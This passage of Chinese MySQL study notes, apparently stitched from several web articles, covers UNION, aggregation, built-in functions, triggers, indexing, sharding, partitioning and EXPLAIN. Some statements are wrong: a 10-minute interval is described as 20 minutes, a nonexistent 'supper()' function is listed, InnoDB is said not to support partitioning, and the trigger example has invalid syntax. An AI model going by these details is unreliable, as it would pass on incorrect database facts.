| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |
+----+---------------+---------------------------+-------+---------+
下面是 "apps" APP 的数据：

mysql> SELECT * FROM apps;
+----+------------+-------------------------+---------+
| id | app_name   | url                     | country |
+----+------------+-------------------------+---------+
|  1 | QQ APP     | http://im.qq.com/       | CN      |
|  2 | 微博 APP | http://weibo.com/       | CN      |
|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |
+----+------------+-------------------------+---------+
3 rows in set (0.00 sec)
SQL UNION 实例
下面的 SQL 语句从 "Websites" 和 "apps" 表中选取所有不同的country（只有不同的值）：

实例
SELECT country FROM Websites
UNION
SELECT country FROM apps
ORDER BY country;
执行以上 SQL 输出结果如下：


注释：UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！

SQL UNION ALL 实例
下面的 SQL 语句使用 UNION ALL 从 "Websites" 和 "apps" 表中选取所有的country（也有重复的值）：

实例
SELECT country FROM Websites
UNION ALL
SELECT country FROM apps
ORDER BY country;
执行以上 SQL 输出结果如下：



带有 WHERE 的 SQL UNION ALL
下面的 SQL 语句使用 UNION ALL 从 "Websites" 和 "apps" 表中选取所有的中国(CN)的数据（也有重复的值）：

实例
SELECT country, name FROM Websites
WHERE country='CN'
UNION ALL
SELECT country, app_name FROM apps
WHERE country='CN'
ORDER BY country;
```

### GROUP BY + COUNT + WHERE 组合案例
1 需求是 求订单表1个月内 订单累计费用超过500的有多少人 
根据题意 最先写出的sql是这样的 
```
SELECT SUM(totalfee)AS n  FROM sendorder WHERE  `addtime` > UNIX_TIMESTAMP('2015-12-01') AND `addtime` < UNIX_TIMESTAMP('2016-01-01')  AND state IN(1,2,3,8) GROUP BY uid HAVING  n > 500
但是这样算出来的只是一个数组 不好处理 所有 把这里查询的结果做为一个临时表 算这个表个数
select count(*)from (sum group  having) as t
```

### 常用 MySQL 函数，如：now()、md5()、concat()、uuid()等
https://www.w3schools.com/sql/sql_ref_mysql.asp
length()表示返回字节长度。

char_length()表示返回字符个数。

rand()表示返回0-1之间的随机小数。

round()表示四舍五入。

date_add(now(),interval 10 day)表示10天后的日期。

date_add(now(),interval -10 day)表示10天前的日期。

date_add(now(),interval 10 minute)表示20分钟后的时间。

date_add(now(),interval 10 week)表示10周后的日期

datediff()表示两个日期之间相差的天数。

timestampdiff(hour,now(),'2018-01-21 12:10:20')表示返回两个日期之间的小时差。

date_format(now(),'%Y-%m-%d %H:%i:%s')表示格式化一个日期时间。

from_unixtime()表示将一个时间戳转换为一个日期。

unix_timestamp()表示将一个日期转换为一个时间戳。

from_unixtime(时间戳,'%Y-%m-%d %H:%i:%s')表示将时间戳按指定的格式转换为一个日期。

concat()连接字符串。

repeat('abc',2)表示一个字符串重复几次。

space(20)表示产生20个空格的字符串。

md5(),sha(),sha1(),password()表示加密函数。

supper()表示将字符串转换为大写。

lower()表示将字符串转换为小写。

left()表示从左截取多少长度的子字符串。

right()表示从右截取多少长度的子字符串。

mid()表示从指定位置截取多少长度的子字符串。索引从1开始。

ifnull(表达式1，表达式2)如果表达式1不为空就显示表达式1，否则显示表达式2。

if(表达式，结果1，结果2)如果表达式为真就显示结果1，否则显示结果2。

uuid()表示返回36位唯一随机字符串。

format(1000,2)表示格式化一个数字。

inet-aton()将一个ip地址的字符串转换为一个数字。

inet-ntoa()将一个数字转换为一个ip地址。

### 了解触发器是什么，说个使用场景

触发器，需要触发条件，当条件满足后做什么操作。

触发器用处：比如校内网、开心网、Facebook,你发一个日志，自动通知好友，其实就是在增加日志时做一个后触发，再向通知表中写入条目。

其是一种特殊的存储过程。一般的存储过程是通过存储过程名直接调用，而触发器主要是通过事件(增、删、改)进行触发而被执行的。其在表中数据发生变化时自动强制执行。常见的触发器有两种：after(for)、instead of,用于insert、update、delete事件。

```
after(for)       表示执行代码后，执行触发器
instead of       表示执行代码前，用已经写好的触发器代替你的操作

触发器语法：
　　create trigger 触发器的名字   on 操作表
　　for|after        instead of
　　update|insert|delete
　　as
　　SQL语句

触发器示例
--禁止用户插入数据(实际上是先插入，然后立刻将其删除！)
　　create trigger tr_insert on bank
　　for         --for表示执行之后的操作
　　insert      --即先执行了插入操作，同时在临时表中保存了插入记录
　　as
 　　--执行完插入之后，在新生成的表中将刚刚插入的那条记录删除，
　　 --而此时得到的刚刚插入的记录的id是通过临时表 inserted得到的
　　delete * from bank where cid=(select cid from inserted)
　　生成上面的触发器后，当用户再输入insert语句后就见不到效果了！
　　如：insert into bank values('0004',10000),是插入不进数据库的。
```

### 数据库优化手段
关于数据库优化，网上有不少资料和方法，但是不少质量参差不齐，有些总结的不够到位，内容冗杂。

偶尔发现了这篇文章，总结得很经典，文章流量也很大，所以拿到自己的总结文集中，积累优质文章，提升个人能力，希望对大家今后开发中也有帮助

1、选取最适用的字段属性

MySQL可以很好的支持大数据量的存取，但是一般说来，数据库中的表越小，在它上面执行的查询也就会越快。因此，在创建表的时候，为了获得更好的性能，我们可以将表中字段的宽度设得尽可能小。 

例如，在定义邮政编码这个字段时，如果将其设置为CHAR(255),显然给数据库增加了不必要的空间，甚至使用VARCHAR这种类型也是多余的，因为CHAR(6)就可以很好的完成任务了。同样的，如果可以的话，我们应该使用MEDIUMINT而不是BIGIN来定义整型字段。

另外一个提高效率的方法是在可能的情况下，应该尽量把字段设置为NOT NULL，这样在将来执行查询的时候，数据库不用去比较NULL值。

对于某些文本字段，例如“省份”或者“性别”，我们可以将它们定义为ENUM类型。因为在MySQL中，ENUM类型被当作数值型数据来处理，而数值型数据被处理起来的速度要比文本类型快得多。这样，我们又可以提高数据库的性能。

2、使用连接（JOIN）来代替子查询(Sub-Queries)

MySQL从4.1开始支持SQL的子查询。这个技术可以使用SELECT语句来创建一个单列的查询结果，然后把这个结果作为过滤条件用在另一个查询中。例如，我们要将客户基本信息表中没有任何订单的客户删除掉，就可以利用子查询先从销售信息表中将所有发出订单的客户ID取出来，然后将结果传递给主查询，如下所示：
```
DELETE  FROM  customerinfo

WHERE  CustomerID  NOT  in  (SELECT customerid  FROM  salesinfo)
```
使用子查询可以一次性的完成很多逻辑上需要多个步骤才能完成的SQL操作，同时也可以避免事务或者表锁死，并且写起来也很容易。但是，有些情况下，子查询可以被更有效率的连接（JOIN）..替代。例如，假设我们要将所有没有订单记录的用户取出来，可以用下面这个查询完成：

```
SELECT  *  FROM  customerinfo

WHERE  customerid  NOT IN (SELECT customerid   FROM   salesinfo)
```
如果使用连接（JOIN）..来完成这个查询工作，速度将会快很多。尤其是当salesinfo表中对CustomerID建有索引的话，性能将会更好，查询如下：

```
SELECT  *  FROM  customerinfo

LEFT  JOIN  salesinfo  ON   customerinfo.customerid =salesinfo.customerid

WHERE  salesinfo.customerid   IS NULL
```
连接（JOIN）..之所以更有效率一些，是因为MySQL不需要在内存中创建临时表来完成这个逻辑上的需要两个步骤的查询工作。

3、使用联合(UNION)来代替手动创建的临时表

MySQL从4.0的版本开始支持union查询，它可以把需要使用临时表的两条或更多的select查询合并的一个查询中。在客户端的查询会话结束的时候，临时表会被自动删除，从而保证数据库整齐、高效。使用union来创建查询的时候，我们只需要用UNION作为关键字把多个select语句连接起来就可以了，要注意的是所有select语句中的字段数目要想同。下面的例子就演示了一个使用UNION的查询。
```
SELECT   name,phone  FROM  client UNION

SELECT  name,birthdate  FROM  author  UNION

SELECT  name,supplier FROM product
```
4、事务

尽管我们可以使用子查询（Sub-Queries）、连接（JOIN）和联合（UNION）来创建各种各样的查询，但不是所有的数据库操作都可以只用一条或少数几条SQL语句就可以完成的。更多的时候是需要用到一系列的语句来完成某种工作。但是在这种情况下，当这个语句块中的某一条语句运行出错的时候，整个语句块的操作就会变得不确定起来。设想一下，要把某个数据同时插入两个相关联的表中，可能会出现这样的情况：第一个表中成功更新后，数据库突然出现意外状况，造成第二个表中的操作没有完成，这样，就会造成数据的不完整，甚至会破坏数据库中的数据。要避免这种情况，就应该使用事务，它的作用是：要么语句块中每条语句都操作成功，要么都失败。换句话说，就是可以保持数据库中数据的一致性和完整性。事物以BEGIN关键字开始，COMMIT关键字结束。在这之间的一条SQL操作失败，那么，ROLLBACK命令就可以把数据库恢复到BEGIN开始之前的状态。

```
BEGIN;
  INSERT   INTO   salesinfo   SET   customerid=14;
  UPDATE   inventory   SET   quantity =11   WHERE   item='book';
COMMIT;
```
事务的另一个重要作用是当多个用户同时使用相同的数据源时，它可以利用锁定数据库的方法来为用户提供一种安全的访问方式，这样可以保证用户的操作不被其它的用户所干扰。

5、锁定表

尽管事务是维护数据库完整性的一个非常好的方法，但却因为它的独占性，有时会影响数据库的性能，尤其是在很大的应用系统中。由于在事务执行的过程中，数据库将会被锁定，因此其它的用户请求只能暂时等待直到该事务结束。如果一个数据库系统只有少数几个用户来使用，事务造成的影响不会成为一个太大的问题；但假设有成千上万的用户同时访问一个数据库系统，例如访问一个电子商务网站，就会产生比较严重的响应延迟。

其实，有些情况下我们可以通过锁定表的方法来获得更好的性能。下面的例子就用锁定表的方法来完成前面一个例子中事务的功能。
```
LOCK TABLE inventory WRITE SELECT quantity  FROM   inventory   WHERE Item='book';

...

UPDATE   inventory   SET   Quantity=11   WHERE  Item='book';UNLOCKTABLES
```
这里，我们用一个select语句取出初始数据，通过一些计算，用update语句将新值更新到表中。包含有WRITE关键字的LOCKTABLE语句可以保证在UNLOCKTABLES命令被执行之前，不会有其它的访问来对inventory进行插入、更新或者删除的操作。

6、使用外键

锁定表的方法可以维护数据的完整性，但是它却不能保证数据的关联性。这个时候我们就可以使用外键。

例如，外键可以保证每一条销售记录都指向某一个存在的客户。在这里，外键可以把customerinfo表中的customerid映射到salesinfo表中customerid，任何一条没有合法customerid的记录都不会被更新或插入到salesinfo中。
```
CREATE  TABLE   customerinfo( customerid   int primary key) engine = innodb;

CREATE  TABLE   salesinfo( salesid int not null,customerid  int not null, primary key(customerid,salesid),foreign key(customerid)  references  customerinfo(customerid) on delete cascade)engine = innodb;
```

注意例子中的参数“on delete cascade”。该参数保证当customerinfo表中的一条客户记录被删除的时候，salesinfo表中所有与该客户相关的记录也会被自动删除。如果要在MySQL中使用外键，一定要记住在创建表的时候将表的类型定义为事务安全表InnoDB类型。该类型不是MySQL表的默认类型。定义的方法是在CREATE TABLE语句中加上engine=INNODB。如例中所示。

7、使用索引

索引是提高数据库性能的常用方法，它可以令数据库服务器以比没有索引快得多的速度检索特定的行，尤其是在查询语句当中包含有MAX(),MIN()和ORDERBY这些命令的时候，性能提高更为明显。

那该对哪些字段建立索引呢？

一般说来，索引应建立在那些将用于JOIN,WHERE判断和ORDERBY排序的字段上。尽量不要对数据库中某个含有大量重复的值的字段建立索引。对于一个ENUM类型的字段来说，出现大量重复值是很有可能的情况

例如customerinfo中的“province”..字段，在这样的字段上建立索引将不会有什么帮助；相反，还有可能降低数据库的性能。我们在创建表的时候可以同时创建合适的索引，也可以使用ALTERTABLE或CREATEINDEX在以后创建索引。此外，MySQL从版本3.23.23开始支持全文索引和搜索。全文索引在MySQL中是一个FULLTEXT类型索引，但仅能用于MyISAM类型的表。对于一个大的数据库，将数据装载到一个没有FULLTEXT索引的表中，然后再使用ALTERTABLE或CREATEINDEX创建索引，将是非常快的。但如果将数据装载到一个已经有FULLTEXT索引的表中，执行过程将会非常慢。

8、优化的查询语句

绝大多数情况下，使用索引可以提高查询的速度，但如果SQL语句使用不恰当的话，索引将无法发挥它应有的作用。

下面是应该注意的几个方面。

a、 首先，最好是在相同类型的字段间进行比较的操作

在MySQL3.23版之前，这甚至是一个必须的条件。例如不能将一个建有索引的INT字段和BIGINT字段进行比较；但是作为特殊的情况，在CHAR类型的字段和VARCHAR类型字段的字段大小相同的时候，可以将它们进行比较。

b、 其次，在建有索引的字段上尽量不要使用函数进行操作

例如，在一个DATE类型的字段上使用YEAE()函数时，将会使索引不能发挥应有的作用。所以，下面的两个查询虽然返回的结果一样，但后者要比前者快得多。

ｃ、第三，在搜索字符型字段时，我们有时会使用LIKE关键字和通配符，这种做法虽然简单，但却也是以牺牲系统性能为代价的

例如下面的查询将会比较表中的每一条记录。
```
SELECT  *  FROM  books  WHERE  name  like   "MySQL%"
```
但是如果换用下面的查询，返回的结果一样，但速度就要快上很多：
```
SELECT  *  FROM  books  WHERE  name >=  "MySQL"  and  name  <"MySQM"
```
最后，应该注意避免在查询中让MySQL进行自动类型转换，因为转换过程也会使索引变得不起作用。

### 索引、联合索引（命中条件）
首先明确：为什么要用联合索引？

对于查询语句“SELECT E.* FROM E WHERE E.e1=1 AND E.e3=2”涉及到两列，这个时候我们一般采用一个联合索引(e1, e3)；而不用两个单列索引，这是因为一条查询语句往往应为mysql优化器的关系只用一个索引，就算你有两个索引，他也只用一个；在只用一个的基础之上，联合索引是会比单列索引要快的；

下面讲讲联合索引的使用规则和哪些情况会命中不了联合索引

```
示例如下。首先创建表：
CREATE TABLE E (e1 INT, e2 VARCHAR(9), e3 INT, PRIMARY KEY(e1, e3));
这样就建立了一个联合索引：e1,e3

测试数据

INSERT INTO E
(e1, e2, e3)
VALUES(1, 'aa', 2);
```


触发联合索引是有条件的：
1、使用联合索引的全部索引键，可触发索引的使用。
例如：SELECT E.* FROM E WHERE E.e1=1 AND E.e3=2

2、使用联合索引的前缀部分索引键，如“key_part_1 <op>常量”，可触发索引的使用。
例如：SELECT E.* FROM E WHERE E.e1=1

3、使用部分索引键，但不是联合索引的前缀部分，如“key_part_2 <op>常量”，不可触发索引的使用。
例如：SELECT E.* FROM E WHERE E.e3=1

4、使用联合索引的全部索引键，但索引键不是AND操作，不可触发索引的使用。
例如：SELECT E.* FROM E WHERE E.e3=2 OR E.e1=1

以上通过explain测试即可看出效果

### 分库分表（`水平分表`、`垂直分表`）
https://blog.csdn.net/weixin_44062339/article/details/100491744

https://www.cnblogs.com/technologykai/articles/10830458.html

分库分表是什么

下边以电商系统中的例子来说明，下图是电商系统卖家模块的表结构：

通过以下SQL能够获取到商品相关的店铺信息、地理区域信息：
```
SELECT p.*,r.[地理区域名称],s.[店铺名称],s.[信誉]
FROM [商品信息] p 
LEFT JOIN [地理区域] r ON p.[产地] = r.[地理区域编码]
LEFT JOIN [店铺信息] s ON p.id = s.[所属店铺]
WHERE p.id = ?
```
随着公司业务快速发展，数据库中的数据量猛增，访问性能也变慢了，优化迫在眉睫。分析一下问题出现在哪儿呢？ 关系型数据库本身比较容易成为系统瓶颈，单机存储容量、连接数、处理能力都有限。当单表的数据量达到1000W或100G以后，由于查询维度较多，即使添加从库、优化索引，做很多操作时性能仍下降严重。

方案1：

通过提升服务器硬件能力来提高数据处理能力，比如增加存储容量 、CPU等，这种方案成本很高，并且如果瓶颈在MySQL本身那么提高硬件也是有很的。

方案2：

把数据分散在不同的数据库中，使得单一数据库的数据量变小来缓解单一数据库的性能问题，从而达到提升数据库性能的目的，如下图：将电商数据库拆分为若干独立的数据库，并且对于大表也拆分为若干小表，通过这种数据库拆分的方法来解决数据库的性能问题。

分库分表就是为了解决由于数据量过大而导致数据库性能降低的问题，将原来独立的数据库拆分成若干数据库组成 ，将数据大表拆分成若干数据表组成，使得单一数据库、单一数据表的数据量变小，从而达到提升数据库性能的目的。

垂直分表

分库分表包括分库和分表两个部分，在生产中通常包括：垂直分库、水平分库、垂直分表、水平分表四种方式。

先说 垂直分表：

通常在商品列表中是不显示商品详情信息的，如下图：

用户在浏览商品列表时，只有对某商品感兴趣时才会查看该商品的详细描述。因此，商品信息中商品描述字段访问频次较低，且该字段存储占用空间较大，访问单个数据IO时间较长；商品信息中商品名称、商品图片、商品价格等其他字段数据访问频次较高。

由于这两种数据的特性不一样，因此他考虑将商品信息表拆分如下：

将访问频次低的商品描述信息单独存放在一张表中，访问频次较高的商品基本信息单独放在一张表中。

商品列表可采用以下sql：
```
SELECT p.*,r.[地理区域名称],s.[店铺名称],s.[信誉]
FROM [商品信息] p 
LEFT JOIN [地理区域] r ON p.[产地] = r.[地理区域编码]
LEFT JOIN [店铺信息] s ON p.id = s.[所属店铺]
WHERE...ORDER BY...LIMIT...
```
需要获取商品描述时，再通过以下sql获取：
```
SELECT *
FROM [商品描述] 
WHERE [商品ID] = ?
```
垂直分表定义：将一个表按照字段分成多表，每个表存储其中一部分字段。

它带来的提升是：

1.为了避免IO争抢并减少锁表的几率，查看详情的用户与商品信息浏览互不影响

2.充分发挥热门数据的操作效率，商品信息的操作的高效率不会被商品描述的低效率所拖累。

为什么大字段IO效率低：第一是由于数据量本身大，需要更长的读取时间；第二是跨页，页是数据库存储单位，很多查找及定位操作都是以页为单位，单页内的数据行越多数据库整体性能越好，而大字段占用空间大，单页内存储行数少，因此IO效率较低。第三，数据库以行为单位将数据加载到内存中，这样表中字段长度较短且访问频率较高，内存能加载更多的数据，命中率更高，减少了磁盘IO，从而提升了数据库性能。

一般来说，某业务实体中的各个数据项的访问频次是不一样的，部分数据项可能是占用存储空间比较大的BLOB或是TEXT。例如上例中的商品描述。所以，当表数据量很大时，可以将表按字段切开，将热门字段、冷门字段分开放置在不同库中，这些库可以放在不同的存储设备上，避免IO争抢。垂直切分带来的性能提升主要集中在热门数据的操作效率上，而且磁盘争用情况减少。

通常我们按以下原则进行垂直拆分:

把不常用的字段单独放在一张表;

把text，blob等大字段拆分出来放在附表中;

经常组合查询的列放在一张表中;

垂直分库

通过垂直分表性能得到了一定程度的提升，但是还没有达到要求，并且磁盘空间也快不够了，因为数据还是始终限制在一台服务器，库内垂直分表只解决了单一表数据量过大的问题，但没有将表分布到不同的服务器上，因此每个表还是竞争同一个物理机的CPU、内存、网络IO、磁盘。

经过思考，他把原有的SELLER_DB(卖家库)，分为了PRODUCT_DB(商品库)和STORE_DB(店铺库)，并把这两个库分散到不同服务器，如下图：

由于商品信息与商品描述业务耦合度较高，因此一起被存放在PRODUCT_DB(商品库)；而店铺信息相对独立，因此单独被存放在STORE_DB(店铺库)。

垂直分库是指按照业务将表进行分类，分布到不同的数据库上面，每个库可以放在不同的服务器上，它的核心理念是专库专用。

它带来的提升是：

解决业务层面的耦合，业务清晰

能对不同业务的数据进行分级管理、维护、监控、扩展等

高并发场景下，垂直分库一定程度的提升IO、数据库连接数、降低单机硬件资源的瓶颈

垂直分库通过将表按业务分类，然后分布在不同数据库，并且可以将这些数据库部署在不同服务器上，从而达到多个服务器共同分摊压力的效果，但是依然没有解决单表数据量过大的问题。

水平分库

经过垂直分库后，数据库性能问题得到一定程度的解决，但是随着业务量的增长，PRODUCT_DB(商品库)单库存储数据已经超出预估。粗略估计，目前有8w店铺，每个店铺平均150个不同规格的商品，再算上增长，那商品数量得往1500w+上预估，并且PRODUCT_DB(商品库)属于访问非常频繁的资源，单台服务器已经无法支撑。此时该如何优化？

再次分库？但是从业务角度分析，目前情况已经无法再次垂直分库。

尝试水平分库，将店铺ID为单数的和店铺ID为双数的商品信息分别放在两个库中。

也就是说，要操作某条数据，先分析这条数据所属的店铺ID。如果店铺ID为双数，将此操作映射至RRODUCT_DB1(商品库1)；如果店铺ID为单数，将操作映射至RRODUCT_DB2(商品库2)。此操作要访问数据库名称的表达式为RRODUCT_DB[店铺ID%2 + 1] 。

水平分库是把同一个表的数据按一定规则拆到不同的数据库中，每个库可以放在不同的服务器上。

垂直分库是把不同表拆到不同数据库中，它是对数据行的拆分，不影响表结构

它带来的提升是：

解决了单库大数据，高并发的性能瓶颈。

提高了系统的稳定性及可用性。

稳定性体现在IO冲突减少，锁定减少，可用性指某个库出问题，部分可用`

当一个应用难以再细粒度的垂直切分，或切分后数据量行数巨大，存在单库读写、存储性能瓶颈，这时候就需要进行水平分库了，经过水平切分的优化，往往能解决单库存储量及性能瓶颈。但由于同一个表被分配在不同的数据库，需要额外进行数据操作的路由工作，因此大大提升了系统复杂度。

水平分表

按照水平分库的思路对他把PRODUCT_DB_X(商品库)内的表也可以进行水平拆分，其目的也是为解决单表数据量大的问题，如下图：

与水平分库的思路类似，不过这次操作的目标是表，商品信息及商品描述被分成了两套表。如果商品ID为双数，将此操作映射至商品信息1表；如果商品ID为单数，将操作映射至商品信息2表。此操作要访问表名称的表达式为商品信息[商品ID%2 + 1] 。

水平分表是在同一个数据库内，把同一个表的数据按一定规则拆到多个表中。

它带来的提升是：

优化单一表数据量过大而产生的性能问题

避免IO争抢并减少锁表的几率

库内的水平分表，解决了单一表数据量过大的问题，分出来的小表中只包含一部分数据，从而使得单个表的数据量变小，提高检索性能。

总结

垂直分表：可以把一个宽表的字段按访问频次、是否是大字段的原则拆分为多个表，这样既能使业务清晰，还能提升部分性能。拆分后，尽量从业务角度避免联查，否则性能方面将得不偿失。

垂直分库：可以把多个表按业务耦合松紧归类，分别存放在不同的库，这些库可以分布在不同服务器，从而使访问压力被多服务器负载，大大提升性能，同时能提高整体架构的业务清晰度，不同的业务库可根据自身情况定制优化方案。但是它需要解决跨库带来的所有复杂问题。

水平分库：可以把一个表的数据(按数据行)分到多个不同的库，每个库只有这个表的部分数据，这些库可以分布在不同服务器，从而使访问压力被多服务器负载，大大提升性能。它不仅需要解决跨库带来的所有复杂问题，还要解决数据路由的问题(数据路由问题后边介绍)。

水平分表：可以把一个表的数据(按数据行)分到多个同一个数据库的多张表中，每个表只有这个表的部分数据，这样做能小幅提升性能，它仅仅作为水平分库的一个补充优化。

一般来说，在系统设计阶段就应该根据业务耦合松紧来确定垂直分库，垂直分表方案，在数据量及访问压力不是特别大的情况，首先考虑缓存、读写分离、索引技术等方案。若数据量极大，且持续增长，再考虑水平分库水平分表方案。

### 分区
https://baijiahao.baidu.com/s?id=1655581234130331974&wfr=spider&for=pc

分区表是mysql5.1之后的新特性，合并表已经存在很长时间了。这篇文章主要介绍这两个概念以及他们基本的操作。

一、合并表

合并表说实话是一种将要被淘汰的技术，但是掌握了合并表的概念再去看分区表就比较容易理解一点。

合并表其实就是合并了多个子表的逻辑表，子表使用了myisam存储引擎物理子表，合并表使用merge存储引擎，逻辑表和子表的结构完全相同（包括字段、索引等）。

删除一个合并表，它的子表不会受任何影响，而如果删除其中一个子表则可能会有不同的后果，这要视操作系统而定。

下面我们进行实操一下：创建量两张物理子表t1和t2，然后创建他们俩的合并表。


在上面我们进行了一些初始化操作。而且我们在创建合并表的时候，指定了insert_method为last，意思就是在最后一张物理表的末尾插入真实数据，这里最后一张真实物理表就是t2。此时我们插入一个数据5会发现：t1没有，t2有。


合并表的内容很简单，也很容易理解。既然表能合并肯定也能分开。我们接着看分区表：

二、分区表

分区表就是把一张表分开，对用户来说，分区表是一个独立的逻辑表，但是底层由多个物理子表组成。实现分区的代码实际上是对一组底层表的句柄对象的封装。对分区表的请求，都会通过句柄对象转化成对存储引擎的接口调用。分区表的每一个分区都是有索引的独立表。

分区表发挥大作用的场景：

（1）表非常大以至于无法全部都放在内存中，或者只在表的最后部分有热点数据，其他均是历史数据。

（2）分区表的数据更容易维护。

（3）分区表的数据可以分布在不同的物理设备上。

（4）可以使用分区表来避免某些特殊的瓶颈，例如InnoDB单个索引的互斥访问。

（5）如果需要，还可以备份和恢复独立的分区，这在非常大的数据集的场景下效果非常好。

分开的方式有三种：

（1）水平分区：根据行切分，也就是把记录分开。

（2）垂直分区：根据列切分，也就是把字段分开。

（3）复合分区：水平分区和垂直分区的结合。

我们按照这两种方式来实际操作一下：

1、水平分区

（1）range分区

range分区是基于连续的范围值。


在这里需要注意的是，alter形式删除分区比delete形式更加的高效。一般都是基于日期时间进行分区。

（2）List分区

range分区是基于连续的范围，list是基于确定值的范围，就好比集合。


这种不是指的范围，而是指的具体的值，10号和20在n1分区，30在n2分区。

（3）Hash分区

hash分区指的是根据hash运算的模，最终确定在哪一个分区。比如2020/4=0，就落在分区0上。


此时我们2020/4=0，就会保存在分区0中。

（4）线性Hash分区

线性hash指的是使用2的幂运算法则。运算起来比较麻烦。但是优点是可以使得数据分布均匀。举个例子。假设分区个数num=6，N表示数据最终存储的分区：

第一步：V = power(2, ceiling(log(2, num)))，log是计算NUM以2为底的对数，ceiling()向上取整，power()是取2的次方值；

第二步：N=values&(V-1)，&位与运算，

第三步：while N>=num，此时N =N & (CEIL(V/ 2) - 1)

比如插入2020-01-20，V=8，N=（2020）& （8-1）=4。4<6，所以保存在分区4。

代码就不演示了，区别就是by hash换成by linear hash。

2、垂直分区

垂直分区比较少，直接通过key字段名进行划分即可。


垂直分区相当简单。

3、复合分区

上面介绍了水平和复合的方式，复合分区的方式是进行组合。你可以随意搭配。这里演示一种。


父分区使用list，子分区使用垂直分区。

在这里介绍了分区表的一些概念和基础的使用方法。其实分区表也有很多限制。

分区表的限制：

（1）一个表最多只能有1024个分区。

（2）如果分区字段中有主键或者唯一索引的列，那么所有主键列和唯一索引列都必须包含进来。

（3）分区表中无法使用外键约束。

（4）所有分区都必须使用相同的存储引擎。

（5）某些存储引擎不支持分区。比如说merge、InnoDB、CSV、联合存储引擎等。

MERGE存储引擎。 用户定义的分区和MERGE 存储引擎不兼容。分区表无法合并。

联合存储引擎。 FEDERATED不支持 分区表; 不可能创建分区 FEDERATED表。

CSV存储引擎。 CSV不支持使用存储引擎的分区表; 不可能创建分区CSV表。

InnoDB存储引擎。 InnoDB外键和MySQL分区不兼容。分区 InnoDB表不能有外键引用，也不能有外键引用的列。InnoDB具有或由外键引用的表不能分区。

（6）对于MyISAM表，使用分区表时需要打开更多的文件描述符。

所以在使用的时候一定要注意。

### 会使用 `explain` 分析 SQL 性能问题，了解各参数含义
```
https://zhuanlan.zhihu.com/p/127948040
在了解explain之前，不妨先看下mysql服务大致的逻辑架构图，以对其有一个整体的认识

从图中可以看出,我们的sql在查询的时候主要需要经历以下步骤:

与mysql建立连接
查询缓存是否存在,如果有则直接返回结果
解析器,主要是对sql进行解析
查询优化器,主要对sql进行各种优化,包括重写查询、决定表的读取顺序以及选择合适的索引等等。。并产生执行计划
去存储引擎查询结果
而我们使用explain即是去查询优化器查询执行计划

explain字段解释
看一条简单的执行计划

explain select * from t_user where id = 1;



我们可以看到，一个执行计划会展示12个相关的字段,下面我们对主要字段以及这些字段常见的值进行解释:

id
含义：是一组数字，表示的是查询中执行select子句或者是操作表的顺序

规则：

id不相同的，id值越大越先执行
id相同的,从上到下顺序执行
select_type
常见的值以及描述如下

值描述SIMPLE简单的SELECT语句（不包括UNION操作或子查询操作）PRIMARY查询中最外层的SELECT（如两表做UNION或者存在子查询的外层的表操作为PRIMARY，内层的操作为UNION）UNIONUNION操作中，查询中处于内层的SELECT，即被union的SELECTSUBQUERY子查询中的SELECTDERIVED表示包含在 From 子句中的 Select 查询UNION RESULTunion的结果,此时id为NULL

table
涉及的表

type（重要）
这列很重要,显示了连接使用哪种类型,有无使用索引， 常见的值从最好到最差如下 system > const > eq_ref > ref > range > index > all

各值的描述如下


possible_keys
表示可能用到的索引

key
表示最终用到的key

ref
显示索引的哪一列被使用了，有时候会是一个常量：表示哪些列或常量被用于查找索引列上的值

rows
估算出结果集行数，表示MySQL根据表统计信息及索引选用情况，估算的找到所需的记录所需要读取的行数, 原则上 rows 越少越好。

filtered
查询结果的行数占上面rows的百分比

Extra(重要)
这一列也很重要,主要展示额外的信息说明,能够给出让我们深入理解执行计划进一步的细节信息

常见的值及描述如下


优化原则
通常有以下几种优化原则:

让主要查询语句使用到合适的索引,type出现ALL(全表扫描)需格外注意,同时建立合适的索引以减少possible_keys的数量
type最好能达到ref级别
Extra列出现Using temporary、Using filesort（文件排序）务必去除
优化思路
针对上面提到的几点优化原则,提供如下的优化思路

针对优化原则1，2
上述1,2点其实都可以通过优化索引来达到目的,而要想让我们建的索引达到最优,则需要依据一个原则: 三星索引原则

简单描述就是

☆: where后条件匹配的索引列越多扫描的数据将越少

比如组合索引(a,b,c),最好在where后面能同时用到索引上的a,b,c这三列

☆: 避免再次排序

简单来说,就是排序字段尽量使用索引字段,因为索引默认是排好序的,使用索引字段排序可以避免再次排序

☆: 索引行包含查询语句中所有的列,即覆盖索引

基于这一点，我们应该少用select*来查询，以增加覆盖索引的可能性

如果你的索引能集齐上述三颗星,则说明你的索引是最优的索引！

针对优化原则3
我们创建如下表，并插入一些数据

用户表

CREATE TABLE `t_user`  (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `age` int(11) DEFAULT NULL,
  `group_id` bigint(20) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_name`(`name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1240277101395107842 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;
分组表

CREATE TABLE `t_group`  (
  `id` bigint(20) NOT NULL,
  `group_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;
Using filesort
order by 的字段不在where条件中
下面这条sql会出现Using filesort
select * from t_user where group_id = 2 and age = 32 order by name;

但是下面这条sql不会

```
select * from t_user where group_id = 2 and age = 32 order by group_id ;

```

组合索引跨列
举例:给t_user表创建索引(name,age,group_id)
下面这条sql排序会出现Using filesort
select * from t_user where name= '李A' order by group_id;

但是下面这条就不会

```
select * from t_user where name = '李A' order by age;

```

因为第一条查询order by跳过了age,直接使用了group_id;删除索引(name,age,group_id);
由于group by第一步默认进行了排序,所以当group by 的字段满足上述条件是,也会出现Using filesort,可以在group by后面加上order by null取消排序
Using temporary
临时表的出现对性能影响是很大的,主要会出现在以下情况中

分组字段不在where条件后面,并且group by字段不是最终使用到的索引,原因有点类似于上面的Using filesort
下面这条sql会出现Using temporary
